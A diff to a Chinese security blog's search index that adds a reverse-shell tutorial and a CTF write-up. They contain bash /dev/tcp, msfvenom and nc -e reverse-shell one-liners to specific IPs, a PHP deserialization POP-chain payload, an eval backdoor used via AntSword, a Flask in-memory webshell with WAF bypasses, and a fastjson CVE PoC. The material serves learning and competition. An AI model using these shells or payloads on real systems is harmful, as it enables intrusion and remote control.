@@ -4,6 +4,62 @@
   
     
     <entry>
+      <title>反弹shell</title>
+      <link href="/article/reverse-shell/"/>
+      <url>/article/reverse-shell/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>前置知识</h1><h2 id="正反向shell"><a class="header-anchor" href="#正反向shell">¶</a>正反向shell</h2><ul><li>正向shell: 控制端主动发起连接请求去连接被控制端,  中间网络链路不存在阻碍</li><li>反向shell(反弹shell): 被控端主动发起连接请求去连接控制端,  通常被控端由于防火墙限制、 权限不足、端口被占用等问题导致被控端不能正常接收发送过来的数据包</li></ul><h2 id="Linux标准文件描述符"><a class="header-anchor" href="#Linux标准文件描述符">¶</a>Linux标准文件描述符:</h2><p>Linux系统将所有设备都当作文件来处理, 而Linux用文件描述符来标识每个文件对象; 当Linux启 动的时候会默认打开三个文件描述符</p><table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th><th>默认设备</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td><td>默认设备键盘</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td><td>默认设备显示器</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td><td>默认设备显示器</td></tr></tbody></table><h3 id="更改标准输出-输入的位置"><a class="header-anchor" href="#更改标准输出-输入的位置">¶</a>更改标准输出/输入的位置</h3><p>把标准输出位置更改到test文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>把当前标准输出重定向到test文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> `flag` 1&gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>把test文件中的内容重定向到标准输入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">read</span> user 0&lt; <span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$user</span></span><br></pre></td></tr></table></figure><blockquote><p>标准错误输出和标准输出的区别是，它在命令出错情况下的输出</p></blockquote><p>分配自己的文件描述符: 把文件描述符5指向test文件, 然后把当前输出重定向到文件描述符5(用&amp;引用文件描述符, 即找到文件(描述符指向的目标文件)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&gt; <span class="built_in">test</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;are you ok?&#x27;</span> 1&gt;&amp;5</span><br><span class="line"><span class="built_in">cat</span> <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="dev-null"><a class="header-anchor" href="#dev-null">¶</a>/dev/null</h3><p>特殊文件，写入的任何东西都会被清空。</p><ol><li>把标准错误输出重定向到/dev/null，从而丢掉不想保存的错误信息</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><ol start="2"><li>快速移除文件中的数据而不用删除文件</li></ol><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /dev/null &gt; <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h2 id="重定向"><a class="header-anchor" href="#重定向">¶</a>重定向</h2><p>重定向是把输出定向到文件或者标准流; 重定向输入输出本质上就是重定向文件描述符</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt; 从文件读取输入</span><br><span class="line">&gt; 将输出保存到文件</span><br><span class="line">&gt;&gt; 将输出追加到文件</span><br><span class="line">| 将一个程序的输出作为输入发送到另一个程序(管道符)</span><br></pre></td></tr></table></figure><h1>反弹shell本质</h1><p>被控端主动发起连接请求去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用等问题导 致被控端不能正常接收发送过来的数据包</p><h1>反弹shell方法</h1><h2 id="Bash"><a class="header-anchor" href="#Bash">¶</a>Bash</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 被控端：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line"><span class="comment"># 控制端：</span></span><br><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><p>解释</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个交互式的bash shell</span></span><br><span class="line">bash -i</span><br><span class="line"><span class="comment"># /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发起了一个socket调用,建立一个socket连接,读写这个文件就相当于在这个socket连接中传输数据</span></span><br><span class="line"><span class="comment"># 和10.10.1.11的6666端口建立TCP连接</span></span><br><span class="line">/dev/tcp/10.10.1.11/6666</span><br><span class="line"><span class="comment"># 混合输出（正确、错误的输出都输出到一个地方)</span></span><br><span class="line">&gt;&amp;、&amp;&gt;</span><br></pre></td></tr></table></figure><h1>一些反弹shell</h1><p><a href="https://www.revshells.com/">自动生成反弹shell网站</a></p><h2 id="利用msf生成"><a class="header-anchor" href="#利用msf生成">¶</a>利用msf生成:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash lhost=172.16.8.131  lport=1234</span><br></pre></td></tr></table></figure><p>生成例子:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;0&lt;&amp;84-;exec 84&lt;&gt;/dev/tcp/172.16.8.131/1234;sh &lt;&amp;84 &gt;&amp;84 2&gt;&amp;84&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="直接写"><a class="header-anchor" href="#直接写">¶</a>直接写:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line">bash -i &gt; /dev/tcp/10.10.1.11/6666 0&gt;&amp;1 2&gt;&amp;1</span><br><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/172.16.8.131/1234 0&gt;&amp;1&#x27;</span></span><br><span class="line"></span><br><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.110.130/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="利用nc反弹shell"><a class="header-anchor" href="#利用nc反弹shell">¶</a>利用nc反弹shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.110.130 7777</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 反弹shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>unknowCTF</title>
+      <link href="/article/unknowCTF/"/>
+      <url>/article/unknowCTF/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>web</h1><h2 id="ezpop"><a class="header-anchor" href="#ezpop">¶</a>ezpop</h2><p>反序列化、浅拷贝</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DayDay</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;password===<span class="variable language_">$this</span>-&gt;secret)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Hacker !!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">five</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hahah</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hahah-&gt;<span class="variable">$arg</span>=<span class="string">&quot;Nero&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hahah-&gt;<span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;NoNO;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span></span>)  </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hahah=<span class="variable">$obj</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FFFF</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$four</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;four-&gt;<span class="title function_ invoke__">sihasia</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Music</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Tech</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$info</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$Alkaline</span>=<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$Alkaline</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hello=<span class="string">&quot;Six G0d&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_SayGo</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Do you like&quot;</span>.<span class="variable language_">$this</span>-&gt;hello.<span class="string">&quot;?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_SayGo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$filter</span>=<span class="string">&#x27;/flag/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$poc</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;poc&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$poc</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$poc</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A5%3A%22Hello%22%3A1%3A%7Bs%3A5%3A%22hello%22%3BO%3A4%3A%22five%22%3A1%3A%7Bs%3A5%3A%22hahah%22%3BO%3A5%3A%22Music%22%3A2%3A%7Bs%3A4%3A%22Tech%22%3BN%3Bs%3A1%3A%22a%22%3BO%3A4%3A%22FFFF%22%3A1%3A%7Bs%3A4%3A%22four%22%3BO%3A6%3A%22DayDay%22%3A3%3A%7Bs%3A6%3A%22secret%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A7%3Bs%3A8%3A%22filename%22%3Bs%3A5%3A%22%2Fflflagag%22%3B%7D%7D%7D%7D%7D</span><br><span class="line"></span><br><span class="line">O:5:&quot;Hello&quot;:1:&#123;s:5:&quot;hello&quot;;O:4:&quot;five&quot;:1:&#123;s:5:&quot;hahah&quot;;O:5:&quot;Music&quot;:2:&#123;s:4:&quot;Tech&quot;;N;s:1:&quot;a&quot;;O:4:&quot;FFFF&quot;:1:&#123;s:4:&quot;four&quot;;O:6:&quot;DayDay&quot;:3:&#123;s:6:&quot;secret&quot;;N;s:8:&quot;password&quot;;R:7;s:8:&quot;filename&quot;;s:5:&quot;/flflagag&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="mysecret"><a class="header-anchor" href="#mysecret">¶</a>mysecret</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span></span>&#123;</span><br><span class="line">    <span class="comment">// Something secret in /hint</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dbname = <span class="variable">$dbname</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">link</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">link</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;host, </span><br><span class="line">            <span class="variable">$this</span>-&gt;username, </span><br><span class="line">            <span class="variable">$this</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">select_db</span>(<span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SET NAMES utf8&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Fail&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Backdoor</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]) === <span class="string">&quot;2e59e260ed970274a5b077635a81c88c3ce9356c&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;backdoor&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>公网ip服务器上运行那个py, 反序列化那里就正常填ip, root, 密码和数据库名为空; 把py文件里面的/etc/passwd改成/hint就行</p><p>反序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DB</span></span>&#123;</span><br><span class="line">    <span class="comment">// Something secret in /hint</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$host</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbname</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dbname = <span class="variable">$dbname</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">link</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">link</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(</span><br><span class="line">            <span class="variable">$this</span>-&gt;host, </span><br><span class="line">            <span class="variable">$this</span>-&gt;username, </span><br><span class="line">            <span class="variable">$this</span>-&gt;password</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">select_db</span>(<span class="variable">$this</span>-&gt;dbname);</span><br><span class="line">            <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SET NAMES utf8&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$conn</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Success&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Fail&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">DB</span>(<span class="string">&#x27;ip&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><p>hint里面是密码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rs297ns9s2930003nn29ss55789ss0sn</span><br></pre></td></tr></table></figure><p>蚁剑连接:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># URL地址:</span><br><span class="line">http://e1c3e1fc72887e91.node.nsctf.cn/?pass=rs297ns9s2930003nn29ss55789ss0sn</span><br><span class="line"># 密码:</span><br><span class="line">backdoor</span><br></pre></td></tr></table></figure><p>cp有SUID权限, 将<code>/etc/passwd</code>复制下来, 在最后添加新的用户</p><p>msf生成php反弹木马, 弹出来即可连接, 然后su切换新的用户, 即可读取flag</p><h2 id="Memory"><a class="header-anchor" href="#Memory">¶</a>Memory</h2><p>python flask 内存马</p><p>给的<code>waf.py</code>文件:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">blacklist=[</span><br><span class="line">    <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#123;%&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;cookie&#x27;</span>, <span class="string">&#x27;values&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;globals&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;\\x&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;count&#x27;</span>,<span class="string">&#x27;app&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;modules&quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;sys&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    evilcode= random.sample(blacklist,<span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> evilcode:</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>网站的<code>/hint</code>文件</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> method==<span class="string">&quot;POST&quot;</span>:</span><br><span class="line">    template = request.form.get(<span class="string">&quot;code&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> waf(template):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker Found&quot;</span></span><br><span class="line">    result = render_template_string(template)</span><br></pre></td></tr></table></figure><p>原始内存马:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)</span><br></pre></td></tr></table></figure><p>变形payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">request.application</span><br><span class="line"></span><br><span class="line">request.application.__self__._get_data_for_json.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).__getitem__(&#x27;__bui&#x27;+&#x27;ltins__&#x27;).__getitem__(&#x27;ex&#x27;+&#x27;ec&#x27;)(&quot;app.add_url_rule(&#x27;/h3rmesk1t&#x27;, &#x27;h3rmesk1t&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;shell&#x27;, &#x27;calc&#x27;)).read())&quot;,&#123;&#x27;_request_ct&#x27;+&#x27;x_stack&#x27;:get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;_request_&#x27;+&#x27;ctx_stack&#x27;),&#x27;app&#x27;:get_flashed_messages.__getattribute__(&#x27;__globa&#x27;+&#x27;ls__&#x27;).pop(&#x27;curre&#x27;+&#x27;nt_app&#x27;)&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="json"><a class="header-anchor" href="#json">¶</a>json</h2><p><a href="https://github.com/luelueking/CVE-2022-25845-In-Spring">CVE-2022-25845</a></p><p>直接改poc.java文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="string">&quot;http://7dcef4ada4bd5d44.node.nsctf.cn/json&quot;</span>;  </span><br><span class="line"><span class="keyword">static</span> <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="string">&quot;file:///flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>跑poc即可</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/abc781218700e2248a5bfd8bbffdd815.png" alt="abc781218700e2248a5bfd8bbffdd815.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+            <tag> 反序列化 </tag>
+            
+            <tag> 内存马 </tag>
+            
+            <tag> fake mysql </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Bulldog-1</title>
       <link href="/article/Bulldog-1/"/>
       <url>/article/Bulldog-1/</url>
@@ -20,7 +76,7 @@
       
         <tags>
             
-            <tag> 反弹shell] </tag>
+            <tag> 反弹shell </tag>
             
             <tag> 信息收集 </tag>
             
@@ -759,9 +815,9 @@
             
             <tag> 提权 </tag>
             
-            <tag> 漏洞利用 </tag>
-            
             <tag> 反弹shell </tag>
+            
+            <tag> 漏洞利用 </tag>
             
         </tags>
       
@@ -813,9 +869,9 @@
       
         <tags>
             
-            <tag> 绕过 </tag>
-            
